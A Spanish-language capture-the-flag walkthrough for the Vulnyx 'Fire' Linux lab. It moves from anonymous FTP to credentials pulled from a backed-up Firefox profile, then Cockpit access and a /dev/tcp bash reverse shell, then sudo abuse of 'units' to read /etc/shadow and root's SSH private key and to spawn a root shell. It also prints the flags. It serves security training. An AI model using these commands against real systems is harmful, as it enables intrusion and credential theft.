---
icon: flag
---

# Fire Vulnyx (Easy - Linux)

## Escaneo de puertos

```shell
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn <IP>
```

```shell
nmap -sCV -p<PORTS> <IP>
```

Info:

```
Starting Nmap 7.95 ( https://nmap.org ) at 2025-09-03 09:30 EDT
Nmap scan report for 192.168.5.94
Host is up (0.0028s latency).

PORT     STATE SERVICE VERSION
21/tcp   open  ftp     pyftpdlib 1.5.7
| ftp-anon: Anonymous FTP login allowed (FTP code 230)
|_-rw-r--r--   1 root     root      4442576 Sep 29  2023 backup.zip
| ftp-syst: 
|   STAT: 
| FTP server status:
|  Connected to: 192.168.5.94:21
|  Waiting for username.
|  TYPE: ASCII; STRUcture: File; MODE: Stream
|  Data connection closed.
|_End of status.
22/tcp   open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 (protocol 2.0)
| ssh-hostkey: 
|   3072 f0:e6:24:fb:9e:b0:7a:1a:bd:f7:b1:85:23:7f:b1:6f (RSA)
|   256 99:c8:74:31:45:10:58:b0:ce:cc:63:b4:7a:82:57:3d (ECDSA)
|_  256 60:da:3e:31:38:fa:b5:49:ab:48:c3:43:2c:9f:d1:32 (ED25519)
80/tcp   open  http    Apache httpd 2.4.56 ((Debian))
|_http-server-header: Apache/2.4.56 (Debian)
|_http-title: Apache2 Debian Default Page: It works
9090/tcp open  http    Cockpit web service 221 - 253
|_http-title: Did not follow redirect to https://192.168.5.94:9090/
MAC Address: 08:00:27:C3:49:98 (PCS Systemtechnik/Oracle VirtualBox virtual NIC)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 36.91 seconds
```

Veremos que hay varios puertos abiertos, si entramos al puerto `80` veremos una pagina normal de `apache2`, pero nada interesante, por lo que vamos a meternos por el servicio `FTP` de forma anonima.

## FTP

```shell
ftp anonymous@<IP>
```

Dejamos la contraseña vacia y veremos que estaremos dentro, si listamos veremos lo siguiente:

```
229 Entering extended passive mode (|||58685|).
150 File status okay. About to open data connection.
-rw-r--r--   1 root     root      4442576 Sep 29  2023 backup.zip
226 Transfer complete.
```

Veremos un archivo `.zip` bastante interesante, por lo que vamos a descargarnoslo y descomprimirlo.

```shell
get backup.zip
```

Una vez que nos lo descarguemos lo descomprimiremos, echo esto veremos lo siguiente:

```shell
unzip backup.zip
```

Info:

```
drwxr-xr-x  3 root root    4096 Sep 29  2023 mozilla
```

Vemos que nos descomprime una carpeta de `mozilla`, tiene pinta de que es un `backup` de alguna configuracion o informacion del navegador `mozilla` las cuales puede tener algo interesante dentro.

Podriamos copiarnos el archivo que puede ser interesante y configurar un `profile` para abrirlo con dicho usuario con dicha informacion:

```shell
cp -r pe1jatah.default-esr /<PATH_USER>/.mozilla/firefox/
nano /<PATH_USER>/.mozilla/firefox/profiles.ini

#Dentro del nano
[ProfileX]
Name=Backup2023
IsRelative=1
Path=pe1jatah.default-esr
Default=0
```

Lo guardamos y ahora ejecutamos el siguiente comando para que se nos habra la seleccion de perfiles:

```shell
chown kali:kali /<PATH_USER>/.mozilla/firefox/pe1jatah.default-esr
firefox -P
```

Info:

<figure><img src="../../.gitbook/assets/Captura de pantalla 2025-09-03 154213.png" alt=""><figcaption></figcaption></figure>

Le daremos a `Start Firefox` para que se nos habra la ventana con la informacion de dicho usuario en la ruta que configuramos para que cargue el `backup`.

Si nos vamos a `about:logins` veremos que nos muestra un usuario y contraseña:

```
User: marco
Pass: m@rc0!123
```

Ahora si nos metemos en la siguiente `URL`.

```
URL = https://<IP>:9090/
```

Veremos un `login` si metemos dichas credenciales, veremos que nos deja, veremos tambien de seguido que hay un apartado llamado `Terminal` si entramos veremos que tenemos literalmente la terminal del usuario `marco`, pero vamos a realizar un `reverse shell` mejor.

```shell
bash -i >& /dev/tcp/<IP>/<PORT> 0>&1
```

Antes de enviarlo nos pondremos a la escucha de esta forma:

```shell
nc -lvnp <PORT>
```

Ahora si enviamos lo anterior y volvemos a donde tenemos la escucha veremos lo siguiente:

```
listening on [any] 7777 ...
connect to [192.168.5.50] from (UNKNOWN) [192.168.5.94] 56870
marco@fire:~$ whoami
whoami
marco
```

Vamos a sanitizar la shell (`TTY`).

### Sanitización de shell (TTY)

```shell
script /dev/null -c bash
```

```shell
# <Ctrl> + <z>
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=/bin/bash

# Para ver las dimensiones de nuestra consola en el Host
stty size

# Para redimensionar la consola ajustando los parametros adecuados
stty rows <ROWS> columns <COLUMNS>
```

Una vez echo esto leeremos la `flag` del usuario.

> user.txt

```
5400962bb9d361da14bc28ac666e3ad7
```

## Escalate Privileges

Si hacemos `sudo -l` veremos lo siguiente:

```
Matching Defaults entries for marco on fire:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

User marco may run the following commands on fire:
    (root) NOPASSWD: /usr/bin/units
```

Vemos que podemos ejecutar el binario `units` como el usuario `root`, por lo que vamos a investigar que hace.

Vemos que con el `-f` o `--file` podremos cargar un archivo, vamos a probar a leer el `shadow` a ver si funciona:

```shell
sudo /usr/bin/units -f /etc/shadow
```

Info:

```
units: unit 'root:$y$j9T$osl79yb5xA0i0zvTVWwzW/$wVaUnGg.GYsZNaKqzBkQyLN3NHiw.Cdp9gfPbLCmdd/:19629:0:99999:7:::' lacks a definition at line 1 of '/etc/shadow'
units: unit 'daemon:*:19372:0:99999:7:::' lacks a definition at line 2 of '/etc/shadow'
units: unit 'bin:*:19372:0:99999:7:::' lacks a definition at line 3 of '/etc/shadow'
units: unit 'sys:*:19372:0:99999:7:::' lacks a definition at line 4 of '/etc/shadow'
units: unit 'sync:*:19372:0:99999:7:::' lacks a definition at line 5 of '/etc/shadow'
units: unit 'games:*:19372:0:99999:7:::' lacks a definition at line 6 of '/etc/shadow'
units: unit 'man:*:19372:0:99999:7:::' lacks a definition at line 7 of '/etc/shadow'
units: unit 'lp:*:19372:0:99999:7:::' lacks a definition at line 8 of '/etc/shadow'
units: unit 'mail:*:19372:0:99999:7:::' lacks a definition at line 9 of '/etc/shadow'
units: unit 'news:*:19372:0:99999:7:::' lacks a definition at line 10 of '/etc/shadow'
units: unit 'uucp:*:19372:0:99999:7:::' lacks a definition at line 11 of '/etc/shadow'
units: unit 'proxy:*:19372:0:99999:7:::' lacks a definition at line 12 of '/etc/shadow'
units: unit 'www-data:*:19372:0:99999:7:::' lacks a definition at line 13 of '/etc/shadow'
units: unit 'backup:*:19372:0:99999:7:::' lacks a definition at line 14 of '/etc/shadow'
units: unit 'list:*:19372:0:99999:7:::' lacks a definition at line 15 of '/etc/shadow'
units: unit 'irc:*:19372:0:99999:7:::' lacks a definition at line 16 of '/etc/shadow'
units: unit 'gnats:*:19372:0:99999:7:::' lacks a definition at line 17 of '/etc/shadow'
units: unit 'nobody:*:19372:0:99999:7:::' lacks a definition at line 18 of '/etc/shadow'
units: unit '_apt:*:19372:0:99999:7:::' lacks a definition at line 19 of '/etc/shadow'
units: unit 'systemd-network:*:19372:0:99999:7:::' lacks a definition at line 20 of '/etc/shadow'
units: unit 'systemd-resolve:*:19372:0:99999:7:::' lacks a definition at line 21 of '/etc/shadow'
units: unit 'messagebus:*:19372:0:99999:7:::' lacks a definition at line 22 of '/etc/shadow'
units: unit 'systemd-timesync:*:19372:0:99999:7:::' lacks a definition at line 23 of '/etc/shadow'
units: unit 'sshd:*:19372:0:99999:7:::' lacks a definition at line 24 of '/etc/shadow'
units: unit 'systemd-coredump:!*:19372::::::' lacks a definition at line 25 of '/etc/shadow'
units: unit 'Debian-exim:!:19629:0:99999:7:::' lacks a definition at line 26 of '/etc/shadow'
units: unit 'dnsmasq:*:19629:0:99999:7:::' lacks a definition at line 27 of '/etc/shadow'
units: unit 'cockpit-ws:*:19629:0:99999:7:::' lacks a definition at line 28 of '/etc/shadow'
units: unit 'cockpit-wsinstance:*:19629:0:99999:7:::' lacks a definition at line 29 of '/etc/shadow'
units: unit 'marco:$y$j9T$BulK6se4R2EuZXvjmB/ji1$ma4QEyveuDGsDiS5tG45V88jDFh1/tQUbX6X.Xnh5K1:19629:0:99999:7:::' lacks a definition at line 30 of '/etc/shadow'
0 units, 0 prefixes, 0 nonlinear units

You have: ^C
```

Vemos que si funciona, por lo que vamos a probar a leer la `id_rsa` del usuario `root` a ver si tiene.

```shell
sudo /usr/bin/units -f /root/.ssh/id_rsa
```

Info:

```
units: unit '-----BEGIN' in units file '/root/.ssh/id_rsa' on line 1 ignored.  It contains invalid character '-'
units: unit 'MIIEowIBAAKCAQEA4zyTaEdG9ndkXzil42utXutJCywNF5siqTqPYP8e2OfNCA26' lacks a definition at line 2 of '/root/.ssh/id_rsa'
units: unit 'hLDrlYAhzXDi/zQA+2IteiKtzJBAX3F9ZLqZRkkFswpjW7OeP3uq/OkAppLRrWff' lacks a definition at line 3 of '/root/.ssh/id_rsa'
units: unit '25TX5BZAFw7le1gzCNnA5U7SPQWZMkCdC+JAxrx3pkX0MLI5hn5UTNuZkl4XCozV' lacks a definition at line 4 of '/root/.ssh/id_rsa'
units: unit 'IUmrErfyWhydNlAIGJhfMiJ8EC6+BY+/oW9XN2YoVR8a0sLz0gWHAAKRQkQMqjPn' lacks a definition at line 5 of '/root/.ssh/id_rsa'
units: unit 'A6cnfeXO6KprGq2O0ev81FhBeVqkrrrvSHvNSXrvqNL/N8fPZVD452ene3CVvQIm' lacks a definition at line 6 of '/root/.ssh/id_rsa'
units: unit 'ohjNikvqqnLhCM4Hl/CtQL8w1rl+Uih19mfiuQIDAQABAoIBAQCLiqZm0eZ08cpU' lacks a definition at line 7 of '/root/.ssh/id_rsa'
units: unit 'YyATsQrtEAVx8+IyTdUSIODtSp1xy57vxCZ214JD80ROuXTcDN5RgO+2YddimG6/' lacks a definition at line 8 of '/root/.ssh/id_rsa'
units: unit 'bZz4H1KCg9MZKFbteDbEezf8SUVaBSz3lKM2X4fYDAXdYwtvHDFyzO2Uozudt3Nl' lacks a definition at line 9 of '/root/.ssh/id_rsa'
units: unit 'FaKbKpxmrlO3apvSz49d1PQFopEC/NY/jVl3o3tReriYC+DIgYaY/i8kZTHL8eY8' lacks a definition at line 10 of '/root/.ssh/id_rsa'
units: unit 'x8OMDIFag7CnPMDVGsmyTwvVwao1GNR6KZxI+j9caOtaurzxd9vnEzYim2e1dLDA' lacks a definition at line 11 of '/root/.ssh/id_rsa'
units: unit 'K2EfYUssTu+9QiSVOk1TUaiGiZU11he4H3lMzDjEq4epRGwwyQUdE3B/cBpSDClH' lacks a definition at line 12 of '/root/.ssh/id_rsa'
units: unit 'HX4Ph7KBAoGBAPj7v+IsC0XTGWTXjKclDn/Ah6COXRAWMJRkiQCK8hi8FtAqxgwQ' lacks a definition at line 13 of '/root/.ssh/id_rsa'
units: unit '08eNxg57Dn7284DahjOMJYXtuY9P+jOoYg26ICazkwg+BnsZvfEjJxvFMXnYnDyw' lacks a definition at line 14 of '/root/.ssh/id_rsa'
units: unit 'Z1w0MOPR5S9p/9gTLinHEIt+rGS4rOZXd9llVq187i+FyiB/L9nWTDxRAoGBAOmj' lacks a definition at line 15 of '/root/.ssh/id_rsa'
units: unit '8AyUkAiJYBY/lX8TS8EORBpUljpfTPfmg6s19pwxP4K9hUkW1MNduBth3Nw6FRRZ' lacks a definition at line 16 of '/root/.ssh/id_rsa'
units: unit '2jm4Gw6k+l9+MAsyoOldD5SFezX7bfll4+pqWG/CRKnnE4Ot7OXvSeab6U2cpLhB' lacks a definition at line 17 of '/root/.ssh/id_rsa'
units: unit 'UKLM9vVvCbS3608twDg42DZ22bPEjNnc02puzu3pAoGAFC1apHqLQ1JTKX/qTxVK' lacks a definition at line 18 of '/root/.ssh/id_rsa'
units: unit 'soGovBMtaYNS1oO7MocQDX8YnjAJMqsebnqHxV6lkxZyL0wGOiEuXUchlYKWtR79' lacks a definition at line 19 of '/root/.ssh/id_rsa'
units: unit 'Kz2dI2XEEZPtNIamhOcjYTW+x7ANIUHubmNwXtYAq7H8YMdVI1+VcKiIUfVBVb1a' lacks a definition at line 20 of '/root/.ssh/id_rsa'
units: unit '4gw7VP3d044VDkMgXpfmP7ECgYB4r7sm9HK2RigBNhUGEDSYY8MgCsOTIXlDsKog' lacks a definition at line 21 of '/root/.ssh/id_rsa'
units: unit '/X4GzpWs9jLsP0PmKvoYAuQwSjxrR8KnAAfR97xxKWCt2Bgwk2ah5JVxnBABvPUP' lacks a definition at line 22 of '/root/.ssh/id_rsa'
units: unit 'OKG4ERSg4wE8itINMB7vZWgNNDYOC4cYoWGMBDByTnLZcpuRLyPYdmocJxJO03fN' lacks a definition at line 23 of '/root/.ssh/id_rsa'
units: unit 'ybFQSQKBgA9X6z0WlFOWUqx7OcIhbeVAiYisi+582Wt2G+aUVM71S49gk5lxh1Oe' lacks a definition at line 24 of '/root/.ssh/id_rsa'
units: unit '+IxWgWsAvedbz9YigaVeZ/X1seIRs97IhZszK6QYMYsdJ/bu6Qzrd/pibLT52nDD' lacks a definition at line 25 of '/root/.ssh/id_rsa'
units: unit '/7EWKpTCqpAyAmdNA/B0jMprzP/4njtuOfvGbjDrv0jQ8qyJCv0r' lacks a definition at line 26 of '/root/.ssh/id_rsa'
units: unit '-----END' in units file '/root/.ssh/id_rsa' on line 27 ignored.  It contains invalid character '-'
0 units, 0 prefixes, 0 nonlinear units

You have: ^C
```

Vemos que si tiene, pero es un rollo tener que limpiarlo, por lo que vamos a probar este otro metodo para escalar a `root`.

```shell
sudo /usr/bin/units -h
```

Ahora dentro de este apartado haremos `!/bin/bash` le damos a `ENTER`...

```
root@fire:/home/marco# whoami
root
```

Y veremos que con esto ya seremos `root`, por lo que leeremos la `flag` de `root`.

> root.txt

```
5df134b18a5bf4240d6b29cf0ab968a8
```
